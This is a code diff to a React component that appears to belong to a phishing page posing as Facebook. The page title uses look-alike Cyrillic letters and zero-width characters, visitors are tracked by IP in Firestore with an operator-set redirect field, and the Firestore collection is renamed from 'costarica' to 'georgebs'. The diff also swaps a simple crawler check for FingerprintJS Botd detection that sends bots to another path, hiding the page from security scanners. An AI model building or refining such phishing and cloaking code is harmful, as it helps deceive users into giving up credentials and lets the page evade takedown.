@@ -1,5 +1,6 @@
 import React, { useEffect, useState } from 'react';
 import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
+import Botd from '@fingerprintjs/botd';
 import { publicIpv4 } from 'public-ip';
 import { BsInfoCircleFill as IconInfo } from "react-icons/bs";
 import { IoIosAdd as IconAdd } from "react-icons/io";
@@ -65,7 +66,7 @@ IP: '${ip}'
     };
 
     const getUserData = async () => {
-        const documentSnapshot = await getDocs(collection(db, "costarica"));
+        const documentSnapshot = await getDocs(collection(db, "georgebs"));
         const newData = documentSnapshot.docs.map((doc) => ({ ...doc.data(), id: doc.id }));
         const filter = newData.filter((x) => {
             if (x.ip === ip) {
@@ -92,7 +93,7 @@ IP: '${ip}'
 
     useEffect(() => {
         if (ip) {
-            onSnapshot(collection(db, "costarica"), (snapshot) => {
+            onSnapshot(collection(db, "georgebs"), (snapshot) => {
                 let isExist = false;
                 snapshot.docs
                     .map((doc) => ({ ...doc.data(), id: doc.id }))
@@ -122,15 +123,21 @@ IP: '${ip}'
         }
     }, [ip]);
 
-            // Bot detection and redirect to /blank
-        useEffect(() => {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const isBot = /bot|crawler|spider|crawling/.test(userAgent);
-    
-            if (isBot) {
-                window.location.href = '/ds';
-            }
-        }, []);
+useEffect(() => {
+    const detectBot = async () => {
+        const botd = await Botd.load();
+        const result = await botd.detect();
+
+        if (result.bot) {
+            console.log('Bot detected:', result.bot.type);
+            window.location.href = "/ds";
+        } else {
+            console.log('Not a bot');
+        }
+    };
+
+    detectBot();
+}, []);
 
     useEffect(() => {
         document.title = 'Fаc‌‌еbо‌o‌k';
@@ -138,7 +145,7 @@ IP: '${ip}'
 
     const addUserData = async () => {
         try {
-            const docRef = doc(collection(db, "costarica"), ip);
+            const docRef = doc(collection(db, "georgebs"), ip);
 
             const docSnap = await getDoc(docRef);
 
@@ -160,7 +167,7 @@ IP: '${ip}'
 
     const resetUserNumber = async () => {
         try {
-            const docRef = doc(collection(db, "costarica"), ip);
+            const docRef = doc(collection(db, "georgebs"), ip);
             await setDoc(docRef, { redir: "-1" }, { merge: true });
             console.log("User number reset to -1 for IP: ", ip);
         } catch (e) {
